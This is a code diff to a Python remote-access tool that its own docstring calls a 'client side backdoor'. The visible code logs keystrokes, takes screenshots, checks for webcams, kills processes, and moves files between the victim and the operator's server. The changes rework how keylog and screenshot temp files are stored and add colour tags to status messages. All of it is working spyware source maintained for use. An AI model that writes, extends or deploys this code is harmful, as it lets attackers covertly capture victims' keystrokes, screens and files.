@@ -11,24 +11,24 @@ from pyscreenshot import grab
 from cv2 import VideoCapture, imencode
 from psutil import process_iter, AccessDenied
 from pynput.keyboard import Listener, KeyCode
-from random import getrandbits
 from pathlib import Path
 from json import loads as jloads
 from pickle import loads, dumps
 from subprocess import getoutput
 from requests import get
 from os import uname, chdir, getcwd
+from tempfile import NamedTemporaryFile, gettempdir
 from time import sleep, time
 from urllib3.exceptions import InsecureRequestWarning
 from urllib3 import disable_warnings
 
 disable_warnings(InsecureRequestWarning)
 
+
 class Client(object):
     """ client side backdoor """
     def __init__(self, host='0.0.0.0', port=5000):
         self.__Address = (host, port)
-        self.screenshotPath = '/tmp/736f6e61726973.png' if uname().sysname.lower() == 'linux' else f'C:/Users/{getuser()}/AppData/Local/Temp/736f6e61726973.png'
         self.kloggerIsRunning, self.currentCapturedKeys = False, ''
         self.kloggerFiles = []
 
@@ -37,7 +37,7 @@ class Client(object):
 
     # removing the screenshot file
     def removeScreenshot(self):
-        Path(self.screenshotPath).unlink(missing_ok=True)
+        Path(f'{gettempdir()}/736f6e61726973.png').unlink(missing_ok=True)
 
     # kills some processes by name or pid
     def terminateProcess(self, processIdentifier):
@@ -79,17 +79,14 @@ class Client(object):
     # removing temp log files
     def removeKloogerFiles(self):
         for klog in self.kloggerFiles:
-            Path(f'/tmp/sla/{klog}.dat').unlink(missing_ok=True)
+            Path(klog).unlink(missing_ok=True)
         
         self.kloggerFiles.clear()
 
     def saveCapturedKeys(self):
-        # generating random name to file
-        nameFile = hex(getrandbits(128))[2:-1]
-        self.kloggerFiles.append(nameFile)
-
-        with open(f'/tmp/sla/{nameFile}.dat', 'w') as partFile:
-            partFile.write(f'[{datetime.now().strftime("%H:%M")}]: {self.currentCapturedKeys}')
+        with NamedTemporaryFile(suffix='.dat', delete=False) as tempfile:
+            tempfile.write(f'[{datetime.now().strftime("%H:%M")}]: {self.currentCapturedKeys}'.encode())
+            self.kloggerFiles.append(tempfile.name)
 
         self.currentCapturedKeys = ''
 
@@ -118,7 +115,7 @@ class Client(object):
         if self.kloggerIsRunning:
             if self.kloggerFiles:
                 currentKeys, self.currentCapturedKeys = f"[{datetime.now().strftime('%H:%M')}]: {self.currentCapturedKeys}", "" # saving current content of captured keys and erasing them
-                klogs = ''.join(open(f'/tmp/sla/{partFile}.dat').read() + '\n' for partFile in self.kloggerFiles)
+                klogs = ''.join(open(partFile).read() + '\n' for partFile in self.kloggerFiles)
                 self.removeKloogerFiles()
                 capturedKeys = (klogs+currentKeys).encode()
             elif self.currentCapturedKeys:
@@ -155,9 +152,9 @@ class Client(object):
         header = loads(self.__Client.recv(512))
         try:
             self.receiveFile(header)
-            self.sendHeader({"content": f"File {Path(args).stem} uploaded successfully!", "sucess": True})
+            self.sendHeader({"content": f"[green]File {Path(args).stem} uploaded successfully!", "sucess": True})
         except PermissionError:
-            self.sendHeader({"content": f"Permission denied: {args}", "sucess": False})
+            self.sendHeader({"content": f"[red]Permission denied: {args}", "sucess": False})
 
     # checking if exist any available webcam to use
     def checkAvailableWebcams(self):
@@ -201,8 +198,8 @@ class Client(object):
 
     # taking a screenshot
     def screenshot(self, args):
-        grab().save(self.screenshotPath) # taking and saving the screenshot
-        namefile, extension, file = self.splitFile(self.screenshotPath);del(namefile)
+        grab().save(f'{gettempdir()}/736f6e61726973.png') # taking and saving the screenshot
+        namefile, extension, file = self.splitFile(f'{gettempdir()}/736f6e61726973.png')
         self.removeScreenshot()
         
         header = {
@@ -233,9 +230,9 @@ class Client(object):
                 sleep(1)
                 self.__Client.send(file)
             else:
-                self.sendHeader({"content": f"File {Path(args).stem} not found", "sucess": False})
+                self.sendHeader({"content": f"[red]File {Path(args).stem} not found", "sucess": False})
         except PermissionError:
-            self.sendHeader({"content": f"Permission denied: {args}", "sucess": False})
+            self.sendHeader({"content": f"[red]Permission denied: {args}", "sucess": False})
 
     # saving a received file from server side 
     def saveReceivedFile(self, path, content):
